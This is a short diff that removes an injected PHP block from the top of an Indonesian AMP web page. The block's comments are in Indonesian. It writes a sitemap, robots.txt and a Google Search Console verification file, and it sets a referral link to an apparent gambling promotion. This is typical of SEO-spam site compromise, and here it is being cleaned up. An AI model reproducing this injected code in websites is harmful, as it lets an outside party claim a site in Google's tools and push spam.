@@ -1,36 +1,3 @@
-<?php
-//mengatur link web
-$CANONICAL = "http://" .
-$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$REFFERAL='https://heylink.me/pasticuan5000/';
-$GSCHTML='xehCUO0-etJQziL4D03Zf0-s_nGPB3UMe4HyxXZ37Qc';
-
-//membuat file sitemap
-if (file_exists("sitemap.xml")){
-}else{
-$sitemap = fopen('sitemap.xml', 'w');
-$TEX1 = "$CANONICAL";
-fwrite($sitemap ,$TEX1);
-fclose($sitemap);}
-
-// membuat file html gsc
-if (file_exists("googlecfddc7c2bbf14ef5.html")){
-}else{
-$GOOGLE = fopen('googlecfddc7c2bbf14ef5.html', 'w');
-$TEX2 = "google-site-verification: googlecfddc7c2bbf14ef5.html";
-fwrite($GOOGLE ,$TEX2);
-fclose($GOOGLE);}
-
-//membuat file robots.txt
-if (file_exists("robots.txt")){
-}else{
-$ROBOTS = fopen('robots.txt', 'w');
-$TEX3 = "User-agent: *
-Allow: /
-Sitemap: $CANONICAL";
-fwrite($ROBOTS ,$TEX3);
-fclose($ROBOTS);}
-?>
 <!doctype html>
 <html lang="id" amp i-amphtml-binding i-amphtml-layout i-amphtml-no-boilerplate transformed="self;v=1"
     itemscope="itemscope" itemtype="https://schema.org/WebPage">
